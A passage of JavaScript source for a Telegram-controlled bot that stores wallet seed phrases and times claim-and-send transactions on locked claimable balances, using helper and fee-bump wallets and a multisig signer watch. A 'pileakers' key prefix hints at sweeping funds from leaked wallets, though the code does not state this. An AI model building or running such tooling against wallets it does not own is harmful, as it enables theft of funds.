                submit_endpoint_mode: normalizeSubmitEndpointMode((await getSettings()).submit_endpoint_mode),
            });
            const publicSettings = publicCallSubmitSettings(settings);
            await telegramSend(chatId, `${tgLang.submitBeforeSaved}: <b>${publicSettings.submit_before_ms}ms</b>`, back("menu:settings"));
        } else if (pending.action === "telegram_settings") {
            const [token, chat] = text.split("|").map((item) => item.trim());
            if (!token || !chat) {
                throw new Error("Format: BOT_TOKEN|CHAT_ID atau __KEEP__|CHAT_ID");
            }
            const settings = await saveTelegramSettings({ telegram_bot_token: token, telegram_chat_id: chat });
            await telegramDeleteUserMessage(message);
            await telegramSend(chatId, `${tgLang.telegramSettingsSaved}\nChat ID: <code>${escapeTelegramHtml(publicTelegramSettings(settings).telegram_chat_id)}</code>`, back("menu:settings"));
        } else if (pending.action === "add_bot_json") {
            let data;
            try {
                data = JSON.parse(text);
            } catch (err) {
                throw new Error("JSON tidak valid. Kirim object JSON sesuai format bot dashboard.");
            }
            const settings = await getSettings();
            const botData = {
                ...data,
                username: data.username || "telegram-admin",
                user_timezone: data.user_timezone ?? normalizeUserTimezone(settings.user_timezone, 0),
                status: data.status || "active",
                custom_memo: data.custom_memo || "AUTO",
                created_at: utcIso(),
            };
            if (botData.transaction_type === "claim_and_send" && !botData.amount) {
                botData.amount = await resolveClaimAndSendAmountFromClaimables({
                    ...botData,
                    claimable_balance_ids: normalizeClaimableBalanceIds(botData.claimable_balance_ids || botData.claimable_balance_id),
                    selected_claimable_indexes: [],
                    claimable_cache: [],
                });
            }
            if (!botData.bot_name) {
                throw new Error("bot_name wajib diisi di JSON");
            }
            if (await findBotByName(botData.bot_name)) {
                throw new Error("Bot name sudah ada");
            }
            const botRows = await buildWorkerDistributedBots(botData);
            const newBots = await addBots(botRows);
            await telegramDeleteUserMessage(message);
            await telegramSend(chatId, `${tgLang.botTxCreated}: <b>${newBots.length}</b> job\n${tgLang.base}: <b>${escapeTelegramHtml(botData.bot_name)}</b>`, back("menu:bots"));
        }
    } catch (err) {
        await telegramSend(chatId, `${tgLang.failed}: ${escapeTelegramHtml(err.message || err)}`, back());
    }
}

async function handleTelegramCallback(callbackQuery) {
    const data = String(callbackQuery.data || "");
    const chatId = callbackQuery.message?.chat?.id;
    await telegramAnswerCallback(callbackQuery);
    if (!chatId || !(await isAuthorizedTelegramChat(chatId))) {
        const { lang } = await getCurrentTelegramLanguageBundle();
        return telegramAnswerCallback(callbackQuery, lang.chatNotAllowed);
    }
    callbackQuery.__auto_clean_message = shouldAutoCleanTelegramCallback(data);
    const { language: tgLanguage, lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const back = (target = "menu:home") => telegramBackKeyboard(target, tgLanguage.telegram_language);

    try {
        if (data === "noop") {
            return;
        }
        if (data.startsWith("botnew:")) {
            return handleNewBotWizardCallback(callbackQuery);
        }
        if (data === "ledger:input:auto" || data === "ledger:input:manual") {
            const mode = data.endsWith(":manual") ? "manual" : "auto";
            await telegramEditOrSend(callbackQuery, tgLang.ledgerWalletPrompt, back("menu:ledger"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "ledger_wallet", data: { mode }, created_at: Date.now() });
            return;
        }
        if (data.startsWith("ledger:rescan:")) {
            const scan = getTelegramLedgerScan(data.slice("ledger:rescan:".length));
            if (!scan) {
                return telegramEditOrSend(callbackQuery, tgLang.scanExpired, back("menu:ledger"));
            }
            const loading = await createTelegramLoadingSession({
                chatId,
                callbackQuery,
                lang: tgLang,
                title: tgLang.loadingLedgerRescan || tgLang.ledgerRescanProgress,
                subtitle: tgLang.loadingManualScanSubtext || tgLang.loadingKeepOpen,
                keyboard: back("menu:ledger"),
                estimateMs: Math.min(30000, Math.max(8000, ((scan.ledgerEnd - scan.ledger) + 1) * 1200)),
            });
            try {
                const result = await runTelegramLedgerScan(chatId, scan.wallet, scan.ledger, scan.ledgerEnd, false, { lang: tgLang, callbackQuery: loading.callbackQuery, loading });
                await loading.stop();
                return result;
            } catch (err) {
                await loading.stop(`❌ ${escapeTelegramHtml(err.message || err)}`, back("menu:ledger"));
                throw err;
            }
        }
        if (data.startsWith("ledger:excel:")) {
            const scan = getTelegramLedgerScan(data.slice("ledger:excel:".length));
            if (!scan) {
                return telegramEditOrSend(callbackQuery, tgLang.scanExpired, telegramBackKeyboard("menu:ledger"));
            }
            const loading = await createTelegramLoadingSession({
                chatId,
                callbackQuery,
                lang: tgLang,
                title: tgLang.loadingGeneratingExcel || tgLang.ledgerExcelProgress,
                subtitle: tgLang.loadingExcelSubtext || tgLang.loadingKeepOpen,
                keyboard: back("menu:ledger"),
                estimateMs: 15000,
            });
            try {
                const buffer = await buildTelegramLedgerExcelBuffer(scan);
                const filename = telegramLedgerExcelFilename(scan);
                await telegramSendDocumentBuffer(
                    chatId,
                    buffer,
                    filename,
                    `📥 <b>Excel Check Ledger</b>
Wallet: <code>${escapeTelegramHtml(shortKey(scan.wallet, 10))}</code>
Ledger: <b>${escapeTelegramHtml(scan.ledger)} - ${escapeTelegramHtml(scan.ledgerEnd)}</b>`,
                    telegramBackKeyboard("menu:ledger")
                );
                await loading.stop(`<b>${escapeTelegramHtml(tgLang.ledgerExcelSent || "Excel file sent")}</b>`, back("menu:ledger"));
                return telegramAnswerCallback(callbackQuery, tgLang.ledgerExcelSent);
            } catch (err) {
                await loading.stop(`${tgLang.ledgerExcelError}: ${escapeTelegramHtml(err.message || err)}`, back("menu:ledger"));
                return null;
            }
        }
        if (data === "menu:home") {
            return renderTelegramHome(chatId, callbackQuery);
        }
        if (data === "menu:settings") {
            return renderTelegramSettings(chatId, callbackQuery);
        }
        if (data === "menu:timezone") {
            return renderTelegramTimezone(chatId, callbackQuery);
        }
        if (data === "menu:servers") {
            return renderTelegramServers(chatId, callbackQuery);
        }
        if (data.startsWith("servers:page:")) {
            return renderTelegramServers(chatId, callbackQuery, data.slice("servers:page:".length));
        }
        if (data === "menu:funding") {
            return renderTelegramFunding(chatId, callbackQuery);
        }
        if (data === "menu:bump") {
            return renderTelegramBump(chatId, callbackQuery);
        }
        if (data.startsWith("bump:page:")) {
            return renderTelegramBump(chatId, callbackQuery, data.slice("bump:page:".length));
        }
        if (data.startsWith("funding:page:")) {
            return renderTelegramFunding(chatId, callbackQuery, data.slice("funding:page:".length));
        }
        if (data === "menu:destinations") {
            return renderTelegramDestinations(chatId, callbackQuery);
        }
        if (data.startsWith("destinations:page:")) {
            return renderTelegramDestinations(chatId, callbackQuery, data.slice("destinations:page:".length));
        }
        if (data === "menu:workers") {
            return renderTelegramWorkers(chatId, callbackQuery);
        }
        if (data.startsWith("workers:page:")) {
            return renderTelegramWorkers(chatId, callbackQuery, data.slice("workers:page:".length));
        }
        if (data === "menu:bots") {
            return renderTelegramBots(chatId, callbackQuery);
        }
        if (data.startsWith("bots:page:")) {
            return renderTelegramBots(chatId, callbackQuery, data.slice("bots:page:".length));
        }
        if (data === "menu:ledger") {
            return renderTelegramLedger(chatId, callbackQuery);
        }
        if (data === "menu:funding_history") {
            return renderTelegramFundingHistory(chatId, callbackQuery);
        }
        if (data.startsWith("funding_history:page:")) {
            return renderTelegramFundingHistory(chatId, callbackQuery, data.slice("funding_history:page:".length));
        }
        if (data === "menu:logs") {
            return renderTelegramLogs(chatId, callbackQuery);
        }
        if (data.startsWith("logs:page:")) {
            return renderTelegramLogs(chatId, callbackQuery, data.slice("logs:page:".length));
        }
        if (data === "menu:language") {
            return renderTelegramLanguage(chatId, callbackQuery);
        }
        if (data === "menu:multisig") {
            return renderTelegramMultisig(chatId, callbackQuery);
        }
        if (data.startsWith("set:language:")) {
            const languageCode = data.slice("set:language:".length);
            const settings = await saveTelegramLanguageSettings({ telegram_language: languageCode });
            const language = publicTelegramLanguageSettings(settings);
            const lang = getTelegramLanguageText(language.telegram_language);
            const changedText = lang.languageChanged || `${lang.languageSaved}: ${language.label}`;
            await telegramAnswerCallback(callbackQuery, changedText);
            return renderTelegramHome(chatId, callbackQuery);
        }
        if (data.startsWith("set:tz:")) {
            const zone = data.slice("set:tz:".length);
            await saveTimezoneSettings({ user_timezone: zone });
            return renderTelegramTimezone(chatId, callbackQuery);
        }
        if (data === "set:mode:async" || data === "set:mode:sync") {
            const mode = data === "set:mode:sync" ? "sync" : "async";
            const settings = await getSettings();
            await saveCallSubmitSettings({
                submit_before_ms: normalizeSubmitBeforeMs(settings.submit_before_ms),
                submit_endpoint_mode: mode,
            });
            return renderTelegramSettings(chatId, callbackQuery);
        }
        if (data === "input:submit_before") {
            await telegramEditOrSend(callbackQuery, tgLang.submitBeforePrompt, back("menu:settings"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "submit_before", created_at: Date.now() });
            return;
        }
        if (data === "input:telegram_settings") {
            await telegramEditOrSend(callbackQuery, tgLang.telegramSettingsPrompt, back("menu:settings"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "telegram_settings", created_at: Date.now() });
            return;
        }
        if (data === "input:add_bump") {
            await telegramEditOrSend(callbackQuery, tgLang.addBumpPrompt || "Kirim phrase bump wallet per baris.", back("menu:bump"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "add_bump", created_at: Date.now() });
            return;
        }
        if (data === "input:upload_bump") {
            await telegramEditOrSend(callbackQuery, tgLang.uploadBumpPrompt || "Upload file bump.txt.", back("menu:bump"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "add_bump_upload", created_at: Date.now() });
            return;
        }
        if (data.startsWith("bump:del:")) {
            await deleteBumpSponsorByIndex(data.slice("bump:del:".length));
            await telegramAnswerCallback(callbackQuery, tgLang.bumpDeleted || "✅ Bump wallet dihapus");
            return renderTelegramBump(chatId, callbackQuery);
        }
        if (data === "bump:clear:confirm") {
            return telegramEditOrSend(callbackQuery, tgLang.bumpDeleteAllConfirm || "Yakin hapus semua wallet di bump.txt?", {
                inline_keyboard: [
                    [{ text: "✅ Ya, hapus all", callback_data: "bump:clear:yes" }],
                    [{ text: tgLang.back, callback_data: "menu:bump" }],
                ],
            });
        }
        if (data === "bump:clear:yes") {
            const count = await clearAllBumpSponsors();
            await telegramAnswerCallback(callbackQuery, formatTelegramLangText(tgLang.bumpDeleteAllDone || "✅ Semua wallet bump dihapus: {count}", { count }));
            return renderTelegramBump(chatId, callbackQuery);
        }
        if (data === "input:add_server") {
            await telegramEditOrSend(callbackQuery, tgLang.addServerPrompt, back("menu:servers"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "add_server", created_at: Date.now() });
            return;
        }
        if (data === "input:add_destination") {
            await telegramEditOrSend(callbackQuery, tgLang.addDestinationPrompt, back("menu:destinations"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "add_destination", created_at: Date.now() });
            return;
        }
        if (data === "input:add_funding") {
            await telegramEditOrSend(callbackQuery, tgLang.addFundingPrompt, back("menu:funding"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "add_funding", created_at: Date.now() });
            return;
        }
        if (data === "worker:add:pick_server") {
            return renderWorkerServerPicker(chatId, callbackQuery);
        }
        if (data.startsWith("worker:add:server:")) {
            const serverId = data.slice("worker:add:server:".length);
            await telegramEditOrSend(callbackQuery, tgLang.addWorkerPrompt, back("menu:workers"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "worker_name", data: { server_id: serverId }, created_at: Date.now() });
            return;
        }
        if (data === "input:add_bot_json") {
            const template = {
                bot_name: "BOT-1",
                network: "mainnet",
                transaction_mode: "fee_bump",
                helper_range: "1-50",
                claimer_mnemonic: "ISI_PHRASE_CLAIMER",
                destination: "ID_WALLET_TUJUAN",
                unlock_time: "2026-08-13 16:30:00",
                outer_fee: "0.04",
                fee_payer_id: "ID_FUNDING_WALLET",
                transaction_type: "claim_and_send",
                claimable_balance_ids: ["BALANCE_ID_1"],
                custom_memo: "AUTO",
                topup_helpers: false,
                topup_target_balance: "0.07",
                sweep_helpers: false,
                auto_distribute_helpers: true,
            };
            await telegramEditOrSend(callbackQuery, `${tgLang.addBotJsonPrompt}\n<pre>${escapeTelegramHtml(JSON.stringify(template, null, 2))}</pre>`, back("menu:bots"));
            telegramControlState.pendingInputs.set(String(chatId), { action: "add_bot_json", created_at: Date.now() });
            return;
        }
        if (data.startsWith("delete_menu:")) {
            return renderDeleteMenu(chatId, data.slice("delete_menu:".length), callbackQuery);
        }
        if (data.startsWith("del:server:")) {
            await deleteServerById(data.slice("del:server:".length));
            return renderTelegramServers(chatId, callbackQuery);
        }
        if (data.startsWith("del:fund:")) {
            await deleteWalletById(data.slice("del:fund:".length));
            return renderTelegramFunding(chatId, callbackQuery);
        }
        if (data.startsWith("del:dest:")) {
            await deleteDestinationById(data.slice("del:dest:".length));
            return renderTelegramDestinations(chatId, callbackQuery);
        }
        if (data.startsWith("del:worker:")) {
            await deleteWorkerById(data.slice("del:worker:".length));
            return renderTelegramWorkers(chatId, callbackQuery);
        }
        if (data.startsWith("del:bot:")) {
            const hash = data.slice("del:bot:".length);
            const bots = await listBots();
            const target = bots.find((bot) => crypto.createHash("sha1").update(String(bot.bot_name || bot.id)).digest("hex").slice(0, 16) === hash);
            if (target) {
                await deleteBotByName(target.bot_name || target.id);
            }
            return renderTelegramBots(chatId, callbackQuery);
        }
        if (data.startsWith("multi:")) {
            if (data.startsWith("multi:stop:")) {
                const runId = data.slice("multi:stop:".length);
                const stopped = requestTelegramMultisigRunStop(chatId, runId);
                if (!stopped) {
                    return telegramEditOrSend(callbackQuery, "ℹ️ Run batch sudah selesai atau tidak aktif lagi.", telegramBackKeyboard("menu:multisig"));
                }
                return telegramEditOrSend(callbackQuery, tgLang.stopBatchRequested || "🛑 Stop diminta. Bot akan berhenti setelah batch/transaksi yang sedang berjalan selesai.", { inline_keyboard: [[{ text: "⏳ Menunggu stop...", callback_data: "noop" }]] });
            }
            if (data === "multi:watch:set_test") {
                return promptMultisigSignerWatchTestPhrase(chatId, callbackQuery, false);
            }
            if (data === "multi:watch:start") {
                return startMultisigSignerWatchWizard(chatId, callbackQuery);
            }
            if (data === "multi:watch:stop") {
                const stoppedState = await stopMultisigSignerWatch(chatId, "Dihentikan oleh admin");
                const stopText = tgLang.stopBatchRequested || "🛑 Stop diminta.";
                return updateSignerWatchStatusMessage(chatId, stoppedState, tgLang, {
                    callbackQuery,
                    text: stopText,
                    keyboard: telegramBackKeyboard("menu:multisig"),
                });
            }
            if (data === "multi:add_signer") {
                return promptMultisigAddSigner(chatId, callbackQuery);
            }
            if (data === "multi:signers") {
                return renderMultisigSignerList(chatId, callbackQuery);
            }
            if (data.startsWith("multi:signer:del:")) {
                const hash = data.slice("multi:signer:del:".length);
                const rows = await listMultisigSigners();
                const target = rows.find((row) => multisigSignerDeleteHash(row) === hash);
                if (!target) throw new Error("Signer Wallet tidak ditemukan");
                await deleteMultisigSignerById(target.id);
                return renderMultisigSignerList(chatId, callbackQuery, tgLang.signerDeleted || "✅ Signer Wallet deleted");
            }
            if (data === "multi:signers:delete_all_confirm") {
                return telegramEditOrSend(callbackQuery, tgLang.signerDeleteAllConfirm || "Delete all Signer Wallets?", { inline_keyboard: [[{ text: "✅ YES DELETE ALL", callback_data: "multi:signers:delete_all" }], [{ text: tgLang.back, callback_data: "multi:signers" }]] });
            }
            if (data === "multi:signers:delete_all") {
                const count = await deleteAllMultisigSigners();
                return renderMultisigSignerList(chatId, callbackQuery, formatTelegramLangText(tgLang.signerDeleteAllDone || "✅ All Signer Wallets deleted: {count}", { count }));
            }
            if (data === "multi:save_wallets") {
                return promptMultisigSaveWallets(chatId, callbackQuery);
            }
            if (data === "multi:run_saved") {
                return startMultisigSavedBatchWizard(chatId, callbackQuery);
            }
            if (data === "multi:saved_wallets") {
                return renderMultisigSavedWalletList(chatId, callbackQuery);
            }
            if (data.startsWith("multi:saved:del:")) {
                const hash = data.slice("multi:saved:del:".length);
                const rows = await listMultisigSavedWallets();
                const target = rows.find((row) => multisigSavedWalletDeleteHash(row) === hash);
                if (!target) throw new Error("Saved wallet tidak ditemukan");
                await deleteMultisigSavedWalletByPublicKey(target.public_key);
                return renderMultisigSavedWalletList(chatId, callbackQuery, tgLang.savedWalletDeleted);
            }
            if (data === "multi:saved:delete_all_confirm") {
                return telegramEditOrSend(callbackQuery, tgLang.savedWalletDeleteAllConfirm, { inline_keyboard: [[{ text: "✅ YES DELETE ALL", callback_data: "multi:saved:delete_all" }], [{ text: tgLang.back, callback_data: "multi:saved_wallets" }]] });
            }
            if (data === "multi:saved:delete_all") {
                const count = await deleteAllMultisigSavedWallets();
                return renderMultisigSavedWalletList(chatId, callbackQuery, formatTelegramLangText(tgLang.savedWalletDeleteAllDone, { count }));
            }
            if (data === "multi:locked") {
                return renderMultisigLockedList(chatId, callbackQuery);
            }
            if (data === "multi:pending") {
                return renderMultisigPendingList(chatId, callbackQuery);
            }
            if (data.startsWith("multi:protocol")) {
                const network = data.endsWith(":testnet") ? "testnet" : "mainnet";
                const config = await resolveMultisigNetworkConfig({ network });
                const info = await fetchMultisigProtocolInfoWithFallback(config.horizonUrls, MULTISIG_REQUIRED_PROTOCOL_VERSION);
                const lines = [
                    `<b>🧭 Protocol Check ${network.toUpperCase()}</b>`,
                    `Ready: <b>${info.ready ? "YES" : "NO"}</b>`,
                    `Current: <b>${info.current_protocol_version ?? "-"}</b>`,
                    `Required: <b>${info.required_protocol_version}</b>`,
                    `Horizon: <code>${escapeTelegramHtml(info.horizon_url || "-")}</code>`,
                    `Checked: ${escapeTelegramHtml(info.checked_at || "-")}`,
                ];
                if (info.error) lines.push(`Error: ${escapeTelegramHtml(info.error)}`);
                return telegramEditOrSend(callbackQuery, lines.join("\n"), telegramBackKeyboard("menu:multisig"));
            }
            if (data === "multi:delall") {
                const rows = await listMultisigLockedWallets();
                if (!rows.length) {
                    return renderMultisigLockedList(chatId, callbackQuery);
                }
                const keyboard = {
                    inline_keyboard: [
                        [{ text: `✅ Ya, Hapus Semua (${rows.length})`, callback_data: "multi:delall:yes" }],
                        [{ text: "❌ Batal", callback_data: "multi:locked" }],
                    ],
                };
                return telegramEditOrSend(
                    callbackQuery,
                    `<b>⚠️ Konfirmasi Hapus Semua</b>\nTotal locked wallet: <b>${escapeTelegramHtml(rows.length)}</b>\n\nAksi ini hanya menghapus data dari daftar bot/pending, bukan mengirim transaksi blockchain.`,
                    keyboard
                );
            }
            if (data === "multi:delall:yes") {
                const result = await deleteAllMultisigLockedWalletEntries();
                const skippedText = result.pending_skipped_count ? `, pending gagal update: ${result.pending_skipped_count}` : "";
                return renderMultisigLockedList(chatId, callbackQuery, `✅ Semua locked wallet dihapus: ${result.removed_count} row, pending update: ${result.pending_removed_count}${skippedText}`);
            }
            if (data.startsWith("multi:del:")) {
                const hash = data.slice("multi:del:".length);
                const rows = await listMultisigLockedWallets();
                const target = rows.find((row) => multisigLockedDeleteHash(row) === hash);
                if (!target) throw new Error("Locked wallet tidak ditemukan");
                const result = await deleteMultisigLockedWalletEntry({ publicKey: target.public_key, fundingPublicKey: target.funding_public_key, network: target.network });
                return renderMultisigLockedList(chatId, callbackQuery, `✅ Locked wallet dihapus: ${result.removed_count} row, pending update: ${result.pending_removed_count}`);
            }
            return handleMultisigWizardCallback(callbackQuery);
        }
    } catch (err) {
        await telegramEditOrSend(callbackQuery, `❌ Error: ${escapeTelegramHtml(err.message || err)}`, back());
    }
}

async function handleTelegramMessage(message) {
    const chatId = message.chat?.id;
    if (!chatId) {
        return;
    }
    if (!(await isAuthorizedTelegramChat(chatId))) {
        const { lang } = await getCurrentTelegramLanguageBundle();
        return telegramSend(chatId, `❌ ${lang.chatNotAllowed}`);
    }

    const text = String(message.text || "").trim();
    const pending = telegramControlState.pendingInputs.get(String(chatId));
    if (pending && text !== "/cancel") {
        return handleTelegramPendingInput(message, pending);
    }
    if (text === "/cancel") {
        telegramControlState.pendingInputs.delete(String(chatId));
        const { language, lang } = await getCurrentTelegramLanguageBundle();
        return telegramSend(chatId, lang.inputCancelled, telegramMainKeyboard(language.telegram_language));
    }
    if (["/start", "/menu", "menu", "Menu"].includes(text)) {
        return renderTelegramHome(chatId);
    }
    if (text === "/settings") {
        return renderTelegramSettings(chatId);
    }
    if (text === "/servers") {
        return renderTelegramServers(chatId);
    }
    if (text === "/funding") {
        return renderTelegramFunding(chatId);
    }
    if (text === "/wallet") {
        return renderTelegramDestinations(chatId);
    }
    if (text === "/workers") {
        return renderTelegramWorkers(chatId);
    }
    if (text === "/bots") {
        return renderTelegramBots(chatId);
    }
    if (text === "/ledger") {
        return renderTelegramLedger(chatId);
    }
    if (text === "/multisig") {
        return renderTelegramMultisig(chatId);
    }
    if (text === "/logs") {
        return renderTelegramLogs(chatId);
    }
    const { language, lang } = await getCurrentTelegramLanguageBundle();
    return telegramSend(chatId, lang.typeMenuHint, telegramMainKeyboard(language.telegram_language));
}

async function processTelegramUpdate(update) {
    if (update.callback_query) {
        return handleTelegramCallback(update.callback_query);
    }
    if (update.message) {
        return handleTelegramMessage(update.message);
    }
}

function startTelegramControlBot() {
    if (telegramControlState.started) {
        return;
    }
    telegramControlState.started = true;

    const poll = async () => {
        if (telegramControlState.polling) {
            return;
        }
        telegramControlState.polling = true;
        try {
            const settings = normalizeTelegramSettings(await getSettings());
            if (!settings.telegram_bot_token || !settings.telegram_chat_id) {
                telegramControlState.polling = false;
                setTimeout(poll, 10000);
                return;
            }
            const updates = await telegramGetUpdates(settings);
            for (const update of updates) {
                telegramControlState.offset = Math.max(telegramControlState.offset, Number(update.update_id || 0) + 1);
                await processTelegramUpdate(update).catch((err) => console.log(`Telegram control update error: ${err.message || err}`));
            }
        } catch (err) {
            console.log(`Telegram control polling error: ${err.message || err}`);
        } finally {
            telegramControlState.polling = false;
            setTimeout(poll, 1000);
        }
    };

    poll().catch((err) => console.log(`Telegram control start error: ${err.message || err}`));
    console.log("Telegram control bot polling started.");
}

function normalizeWorkerName(workerName) {
    const normalized = String(workerName || "").trim();
    return normalized || "Worker1";
}

function getWorkerBotsKey(workerName) {
    return `${BOTS_WORKER_KEY_PREFIX}${normalizeWorkerName(workerName)}`;
}

function getWorkerDataKey(workerName, dataName) {
    return `pileakers:worker-data:${normalizeWorkerName(workerName)}:${dataName}`;
}

function getBotWorkerName(bot) {
    return normalizeWorkerName(bot?.worker_name);
}

function getBotIdentity(bot) {
    return String(bot?.bot_name || bot?.id || "").trim();
}

function normalizeClaimableBalanceIds(value) {
    const items = Array.isArray(value) ? value : String(value || "").split(/[\s,;]+/);
    const seen = new Set();
    const ids = [];

    for (const item of items) {
        const id = String(item || "").trim();
        if (!id || seen.has(id)) {
            continue;
        }
        seen.add(id);
        ids.push(id);
    }

    return ids;
}

function getBotClaimableBalanceIds(bot) {
    const ids = normalizeClaimableBalanceIds(bot?.claimable_balance_ids);
    return ids.length ? ids : normalizeClaimableBalanceIds(bot?.claimable_balance_id);
}

function normalizeBotForStorage(bot) {
    const claimableBalanceIds = getBotClaimableBalanceIds(bot);

    return {
        ...bot,
        claimable_balance_id: claimableBalanceIds.length ? claimableBalanceIds.join(",") : null,
        claimable_balance_ids: claimableBalanceIds,
        worker_name: getBotWorkerName(bot),
    };
}

async function scanRedisKeys(pattern) {
    if (!redisClient.isOpen) {
        return [];
    }

    const keys = [];
    let cursor = 0;

    do {
        const result = await redisClient.scan(cursor, {
            MATCH: pattern,
            COUNT: 100,
        });
        const nextCursor = Array.isArray(result) ? result[0] : result.cursor;
        const resultKeys = Array.isArray(result) ? result[1] : result.keys;
        cursor = Number(nextCursor || 0);
        keys.push(...(resultKeys || []));
    } while (cursor !== 0);

    return keys;
}

async function listWorkerBotKeys() {
    const keys = new Set();
    const workers = await loadData(WORKERS_KEY);

    for (const worker of workers) {
        const workerName = String(worker?.name || "").trim();
        if (workerName) {
            keys.add(getWorkerBotsKey(workerName));
        }
    }

    const redisKeys = await scanRedisKeys(`${BOTS_WORKER_KEY_PREFIX}*`);
    for (const key of redisKeys) {
        const workerName = key.slice(BOTS_WORKER_KEY_PREFIX.length);
        if (workerName && !workerName.includes(":")) {
            keys.add(key);
        }
    }

    return [...keys].sort((a, b) => a.localeCompare(b, undefined, { numeric: true, sensitivity: "base" }));
}

async function loadAllBots() {
    const bots = [];
    const seen = new Set();

    for (const key of await listWorkerBotKeys()) {
        for (const bot of await loadData(key)) {
            const identity = getBotIdentity(bot);
            if (!identity || seen.has(identity)) {
                continue;
            }
            seen.add(identity);
            bots.push(normalizeBotForStorage(bot));
        }
    }

    for (const bot of await loadData(BOTS_KEY)) {
        const identity = getBotIdentity(bot);
        if (!identity || seen.has(identity)) {
            continue;
        }
        seen.add(identity);
        bots.push(normalizeBotForStorage(bot));
    }

    return bots;
}

async function migrateLegacyBotsToWorkerKeys() {
    const legacyBots = await loadData(BOTS_KEY);
    if (!legacyBots.length || !redisClient.isOpen) {
        return 0;
    }

    const groupedBots = new Map();
    for (const bot of legacyBots) {
        const normalizedBot = normalizeBotForStorage(bot);
        const key = getWorkerBotsKey(normalizedBot.worker_name);
        if (!groupedBots.has(key)) {
            groupedBots.set(key, []);
        }
        groupedBots.get(key).push(normalizedBot);
    }

    let migratedCount = 0;
    for (const [key, workerBots] of groupedBots) {
        const existingBots = await loadData(key);
        const existingNames = new Set(existingBots.map((bot) => getBotIdentity(bot)).filter(Boolean));
        const additions = workerBots.filter((bot) => {
            const identity = getBotIdentity(bot);
            return identity && !existingNames.has(identity);
        });

        if (additions.length > 0) {
            await saveData(key, [...existingBots.map(normalizeBotForStorage), ...additions]);
            migratedCount += additions.length;
        }
    }

    await redisClient.del(BOTS_KEY);
    console.log(
        `Migrated ${legacyBots.length} bot record(s) from ${BOTS_KEY} into worker-specific Redis keys.`
    );
    return migratedCount;
}

function normalizeBoolean(value, fallback = false) {
    if (value === undefined || value === null || value === "") {
        return fallback;
    }

    if (typeof value === "boolean") {
        return value;
    }

    return !["false", "0", "no", "off"].includes(String(value).trim().toLowerCase());
}

function parseHelperRangeSpec(rangeValue, defaultEnd) {
    const rawRange = String(rangeValue || "").trim();
    const finalRange = rawRange || `1-${defaultEnd}`;
    const match = finalRange.replace(/\s+/g, "").match(/^(\d+)(?:-(\d+))?$/);

    if (!match) {
        throw new Error(`Invalid helper_range: ${finalRange}`);
    }

    const start = Number.parseInt(match[1], 10);
    const end = match[2] ? Number.parseInt(match[2], 10) : start;

    if (!Number.isSafeInteger(start) || !Number.isSafeInteger(end) || start < 1 || end < start) {
        throw new Error(`Invalid helper_range: ${finalRange}`);
    }

    return { start, end };
}

function formatHelperRange(start, end) {
    return start === end ? String(start) : `${start}-${end}`;
}

function splitHelperRangeByWorker(helperRange) {
    const helpersPerWorker =
        Number.isSafeInteger(HELPERS_PER_WORKER) && HELPERS_PER_WORKER > 0 ? HELPERS_PER_WORKER : 100;
    const segments = [];
    let cursor = helperRange.start;

    while (cursor <= helperRange.end) {
        const workerIndex = Math.floor((cursor - 1) / helpersPerWorker);
        const blockEnd = (workerIndex + 1) * helpersPerWorker;
        const end = Math.min(helperRange.end, blockEnd);
        segments.push({
            workerIndex,
            start: cursor,
            end,
        });
        cursor = end + 1;
    }

    return segments;
}

function sortWorkersByName(workers) {
    return [...workers].sort((a, b) =>
        String(a.name || "").localeCompare(String(b.name || ""), undefined, { numeric: true, sensitivity: "base" })
    );
}

function getWorkerServerUrl(worker) {
    const serverUrl = String(worker.server_url || "").trim();
    if (!serverUrl || serverUrl === "N/A") {
        return null;
    }
    return serverUrl;
}

function buildBotNameForWorker(baseName, workerName, index) {
    const workerSuffix = String(workerName || `Worker${index + 1}`)
        .trim()
        .replace(/[^A-Za-z0-9_-]+/g, "_");
    return `${baseName}-${workerSuffix}`;
}

async function buildWorkerDistributedBots(botData) {
    const autoDistribute = normalizeBoolean(botData.auto_distribute_helpers, true);

    if (!autoDistribute) {
        return [{ ...botData }];
    }

    const workers = sortWorkersByName(await listWorkers()).filter((worker) => String(worker.name || "").trim());
    const defaultEnd =
        Math.max(workers.length, 1) *
        (Number.isSafeInteger(HELPERS_PER_WORKER) && HELPERS_PER_WORKER > 0 ? HELPERS_PER_WORKER : 100);
    const helperRange = parseHelperRangeSpec(botData.helper_range, defaultEnd);
    const segments = splitHelperRangeByWorker(helperRange);
    const highestWorkerIndex = Math.max(...segments.map((segment) => segment.workerIndex));

    if (workers.length <= highestWorkerIndex) {
        throw new Error(
            `Helper range ${formatHelperRange(helperRange.start, helperRange.end)} needs ${highestWorkerIndex + 1} worker(s), but only ${workers.length} configured`
        );
    }

    const selectedWorkers = [...new Set(segments.map((segment) => segment.workerIndex))].map(
        (workerIndex) => workers[workerIndex]
    );
    const missingServerWorkers = selectedWorkers.filter((worker) => !getWorkerServerUrl(worker));

    if (missingServerWorkers.length > 0) {
        throw new Error(`Worker without server: ${missingServerWorkers.map((worker) => worker.name).join(", ")}`);
    }

    if (selectedWorkers.length > 1) {
        const seenServers = new Map();
        const duplicateWorker = selectedWorkers.find((worker) => {
            const serverUrl = getWorkerServerUrl(worker).toLowerCase();
            if (seenServers.has(serverUrl)) {
                return true;
            }
            seenServers.set(serverUrl, worker.name);
            return false;
        });

        if (duplicateWorker) {
            throw new Error("Each selected worker must use a different server URL");
        }
    }

    const distributedGroupId = segments.length > 1 ? crypto.randomUUID() : null;

    return segments.map((segment, index) => {
        const worker = workers[segment.workerIndex];
        return {
            ...botData,
            bot_name:
                segments.length > 1 ? buildBotNameForWorker(botData.bot_name, worker.name, index) : botData.bot_name,
            parent_bot_name: segments.length > 1 ? botData.bot_name : botData.parent_bot_name,
            distributed_group_id: distributedGroupId || botData.distributed_group_id,
            helper_range: formatHelperRange(segment.start, segment.end),
            helper_segment_index: index + 1,
            helper_segment_total: segments.length,
            helpers_per_worker:
                Number.isSafeInteger(HELPERS_PER_WORKER) && HELPERS_PER_WORKER > 0 ? HELPERS_PER_WORKER : 100,
            worker_name: worker.name,
